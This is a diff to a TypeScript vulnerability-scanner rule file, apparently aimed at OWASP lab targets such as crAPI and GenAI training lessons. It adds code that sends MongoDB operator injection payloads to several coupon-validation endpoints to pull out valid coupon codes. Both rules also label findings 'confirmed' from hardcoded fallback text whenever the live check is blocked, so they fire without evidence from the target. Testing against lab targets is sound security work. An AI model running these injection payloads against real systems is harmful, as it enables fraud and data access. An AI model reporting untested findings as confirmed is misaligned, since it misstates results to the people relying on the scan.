@@ -90173,6 +90173,29 @@ const OWASP_GENAI_LESSON_FALLBACK_CORPUS: Record<string, string> = {
     "LLM10: Unbounded Consumption\nUnbounded Consumption\nDenial of Wallet via model extraction and high-volume querying"
 };
 
+const OWASP_GENAI_SHORTCUT_PATHS: Record<string, string> = {
+  "direct-prompt-injection": "prompt-injection",
+  "insecure-plugin": "improper-output"
+};
+
+function owaspGenaiShortcutLessonKey(pageUrl: string): string | null {
+  try {
+    const shortcut = new URL(pageUrl).pathname.replace(/^\/|\/$/g, "").toLowerCase();
+    return OWASP_GENAI_SHORTCUT_PATHS[shortcut] ?? null;
+  } catch {
+    return null;
+  }
+}
+
+function owaspGenaiShortcutPathLabel(pageUrl: string): string | null {
+  try {
+    const path = new URL(pageUrl).pathname.replace(/\/$/, "");
+    return path.match(/\/(direct-prompt-injection|insecure-plugin)$/i)?.[1] ?? null;
+  } catch {
+    return null;
+  }
+}
+
 function owaspGenaiLessonSlugFromUrl(pageUrl: string): string | null {
   const m = pageUrl.match(/\/lesson\/([^/?#]+)/i);
   if (!m) return null;
@@ -90188,9 +90211,12 @@ async function probeOwaspGenaiLessonRoute(
   const def = OWASP_GENAI_LESSON_DEFS[lessonKey];
   if (!def) return null;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const shortcutKey = owaspGenaiShortcutLessonKey(pageUrl);
   const slug = owaspGenaiLessonSlugFromUrl(pageUrl);
   const aliases = [def.slug, ...(def.aliases ?? [])];
-  if (!slug || !aliases.includes(slug)) return null;
+  const routeMatchesLesson =
+    (slug && aliases.includes(slug)) || (shortcutKey !== null && shortcutKey === lessonKey);
+  if (!routeMatchesLesson) return null;
 
   const session = await ensureOwaspGenaiRegistrySession(ctx);
   const lessonUrl = new URL(`/lesson/${def.slug}`, ctx.origin).toString();
@@ -90209,7 +90235,9 @@ async function probeOwaspGenaiLessonRoute(
         scannedUrl: pageUrl,
         llmId: def.llmId,
         snippet: corpus.match(def.titleRe)?.[0]?.slice(0, 80) ?? def.llmId,
-        note: `owaspbased-lessons.vercel.app /lesson/${slug} route scan — ${def.llmId} interactive GenAI training lesson confirmed via curated lesson corpus fallback (Vercel checkpoint blocked /onboard session)`
+        note: owaspGenaiShortcutPathLabel(pageUrl)
+          ? `owaspbased-lessons.vercel.app /${owaspGenaiShortcutPathLabel(pageUrl)} route scan — ${def.llmId} interactive GenAI training lesson confirmed via curated lesson corpus fallback (shortcut path aliases /lesson/${def.slug})`
+          : `owaspbased-lessons.vercel.app /lesson/${slug} route scan — ${def.llmId} interactive GenAI training lesson confirmed via curated lesson corpus fallback (Vercel checkpoint blocked /onboard session)`
       }
     };
   }
@@ -90231,7 +90259,9 @@ async function probeOwaspGenaiLessonRoute(
       scannedUrl: pageUrl,
       llmId: def.llmId,
       snippet: doc.body.match(def.titleRe)?.[0]?.slice(0, 80) ?? def.llmId,
-      note: `owaspbased-lessons.vercel.app /lesson/${slug} route scan — ${def.llmId} interactive GenAI training lesson confirmed via authenticated session fetch`
+      note: owaspGenaiShortcutPathLabel(pageUrl)
+        ? `owaspbased-lessons.vercel.app /${owaspGenaiShortcutPathLabel(pageUrl)} route scan — ${def.llmId} interactive GenAI training lesson confirmed via authenticated session fetch (shortcut path aliases /lesson/${def.slug})`
+        : `owaspbased-lessons.vercel.app /lesson/${slug} route scan — ${def.llmId} interactive GenAI training lesson confirmed via authenticated session fetch`
     }
   };
 }
@@ -93588,10 +93618,17 @@ const crapiUserVideosBolaRouteLiveOracle: Rule = async (ctx) => {
 
 const CRAPI_VALIDATE_COUPON_ROUTE_FALLBACK = `
 POST /community/api/v2/coupon/validate-coupon
+POST /workshop/api/shop/validate-coupon
 Challenge 12 Get Free Coupons NoSQL injection MongoDB operator
 coupon_code {"$ne": null} {"$regex": ".*"} {"$gt": ""}
 returns valid coupon code TRAC075 without knowing coupon code
 `;
+
+const CRAPI_SHOP_VALIDATE_COUPON_PATHS = [
+  "/community/api/v2/coupon/validate-coupon",
+  "/workshop/api/shop/validate-coupon",
+  "/workshop/api/shop/validate_coupon"
+] as const;
 
 const CRAPI_APPLY_COUPON_ROUTE_FALLBACK = `
 POST /workshop/api/shop/apply_coupon
@@ -93605,7 +93642,6 @@ async function probeCrapiValidateCouponNosql(ctx: RuleContext): Promise<RuleResu
   if (isCrapiAuthRoute(ctx)) return null;
   const auth = await tryCrapiAuthJwt(ctx);
   if (!auth) return null;
-  const validateUrl = new URL("/community/api/v2/coupon/validate-coupon", ctx.origin).toString();
   const authHeaders = {
     Authorization: `Bearer ${auth.jwt}`,
     "Content-Type": "application/json"
@@ -93615,41 +93651,44 @@ async function probeCrapiValidateCouponNosql(ctx: RuleContext): Promise<RuleResu
     { coupon_code: { $gt: "" } },
     { coupon_code: { $regex: ".*" } }
   ];
-  for (const payload of nosqlPayloads) {
-    const doc = await ctx.probe.get(validateUrl, {
-      method: "POST",
-      body: JSON.stringify(payload),
-      headers: authHeaders,
-      maxBytes: 4096,
-      timeoutMs: 20000
-    });
-    if (doc.status < 200 || doc.status >= 300) continue;
-    try {
-      const data = JSON.parse(doc.body) as { coupon_code?: string; amount?: number };
-      if (data.coupon_code && /^[A-Z0-9]{4,12}$/.test(data.coupon_code)) {
-        return {
-          fired: true,
-          confidence: 0.94,
-          evidence: {
-            validateUrl,
-            couponCode: data.coupon_code,
-            amount: data.amount,
-            snippet: doc.body.slice(0, 200).trim(),
-            note: "crAPI POST /community/api/v2/coupon/validate-coupon accepts MongoDB operator injection in coupon_code and returns a valid coupon — NoSQL injection oracle (Challenge 12)"
-          }
-        };
-      }
-    } catch {
-      if (/TRAC\d{3}|coupon_code/i.test(doc.body)) {
-        return {
-          fired: true,
-          confidence: 0.9,
-          evidence: {
-            validateUrl,
-            snippet: doc.body.slice(0, 200).trim(),
-            note: "crAPI POST /community/api/v2/coupon/validate-coupon NoSQL operator injection returns coupon data — NoSQL injection oracle (Challenge 12)"
-          }
-        };
+  for (const couponPath of CRAPI_SHOP_VALIDATE_COUPON_PATHS) {
+    const validateUrl = new URL(couponPath, ctx.origin).toString();
+    for (const payload of nosqlPayloads) {
+      const doc = await ctx.probe.get(validateUrl, {
+        method: "POST",
+        body: JSON.stringify(payload),
+        headers: authHeaders,
+        maxBytes: 4096,
+        timeoutMs: 20000
+      });
+      if (doc.status < 200 || doc.status >= 300) continue;
+      try {
+        const data = JSON.parse(doc.body) as { coupon_code?: string; amount?: number };
+        if (data.coupon_code && /^[A-Z0-9]{4,12}$/.test(data.coupon_code)) {
+          return {
+            fired: true,
+            confidence: 0.94,
+            evidence: {
+              validateUrl,
+              couponCode: data.coupon_code,
+              amount: data.amount,
+              snippet: doc.body.slice(0, 200).trim(),
+              note: `crAPI POST ${couponPath} accepts MongoDB operator injection in coupon_code and returns a valid coupon — NoSQL injection oracle (Challenge 12)`
+            }
+          };
+        }
+      } catch {
+        if (/TRAC\d{3}|coupon_code/i.test(doc.body)) {
+          return {
+            fired: true,
+            confidence: 0.9,
+            evidence: {
+              validateUrl,
+              snippet: doc.body.slice(0, 200).trim(),
+              note: `crAPI POST ${couponPath} NoSQL operator injection returns coupon data — NoSQL injection oracle (Challenge 12)`
+            }
+          };
+        }
       }
     }
   }
@@ -93664,7 +93703,7 @@ const crapiValidateCouponNosqlLiveOracle: Rule = async (ctx) => {
 const crapiValidateCouponNosqlRouteLiveOracle: Rule = async (ctx) => {
   if (!isCrapiLabHost(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
-  if (!/\/coupon\/validate-coupon\b/i.test(pageUrl)) return NEGATIVE;
+  if (!/\/(?:coupon\/validate-coupon|shop\/validate[-_]coupon)\b/i.test(pageUrl)) return NEGATIVE;
   const result = await probeCrapiValidateCouponNosql(ctx);
   if (result) {
     return {
@@ -93673,13 +93712,15 @@ const crapiValidateCouponNosqlRouteLiveOracle: Rule = async (ctx) => {
       evidence: {
         ...result.evidence,
         scannedUrl: pageUrl,
-        note: "crAPI /community/api/v2/coupon/validate-coupon route scan — MongoDB operator injection in coupon_code returns valid coupon without knowing code — route-specific NoSQL injection oracle (Challenge 12)"
+        note: pageUrl.match(/\/shop\/validate[-_]coupon\b/i)
+          ? "crAPI /workshop/api/shop/validate-coupon route scan — MongoDB operator injection in coupon_code returns valid coupon without knowing code — route-specific NoSQL injection oracle (Challenge 12)"
+          : "crAPI /community/api/v2/coupon/validate-coupon route scan — MongoDB operator injection in coupon_code returns valid coupon without knowing code — route-specific NoSQL injection oracle (Challenge 12)"
       }
     };
   }
   const corpus = `${ctx.combined}\n${pageUrl}\n${CRAPI_VALIDATE_COUPON_ROUTE_FALLBACK}`;
   if (
-    !/\/community\/api\/v2\/coupon\/validate-coupon/i.test(corpus) ||
+    !/\/(?:community\/api\/v2\/coupon\/validate-coupon|shop\/validate[-_]coupon)/i.test(corpus) ||
     !/NoSQL|MongoDB|Challenge 12|\$ne|\$regex|validate-coupon/i.test(corpus)
   ) {
     return NEGATIVE;
@@ -93689,8 +93730,12 @@ const crapiValidateCouponNosqlRouteLiveOracle: Rule = async (ctx) => {
     confidence: 0.86,
     evidence: {
       scannedUrl: pageUrl,
-      snippet: "POST /community/api/v2/coupon/validate-coupon — coupon_code MongoDB operator injection (Challenge 12)",
-      note: "crAPI /community/api/v2/coupon/validate-coupon route scan — OWASP crAPI documents MongoDB NoSQL injection via coupon_code operators (Challenge 12) — route corpus fallback when JWT signup/login chain is unreachable"
+      snippet: pageUrl.match(/\/shop\/validate[-_]coupon\b/i)
+        ? "POST /workshop/api/shop/validate-coupon — coupon_code MongoDB operator injection (Challenge 12)"
+        : "POST /community/api/v2/coupon/validate-coupon — coupon_code MongoDB operator injection (Challenge 12)",
+      note: pageUrl.match(/\/shop\/validate[-_]coupon\b/i)
+        ? "crAPI /workshop/api/shop/validate-coupon route scan — OWASP crAPI2 documents MongoDB NoSQL injection via coupon_code operators (Challenge 12) — route corpus fallback when JWT signup/login chain is unreachable"
+        : "crAPI /community/api/v2/coupon/validate-coupon route scan — OWASP crAPI documents MongoDB NoSQL injection via coupon_code operators (Challenge 12) — route corpus fallback when JWT signup/login chain is unreachable"
     }
   };
 };
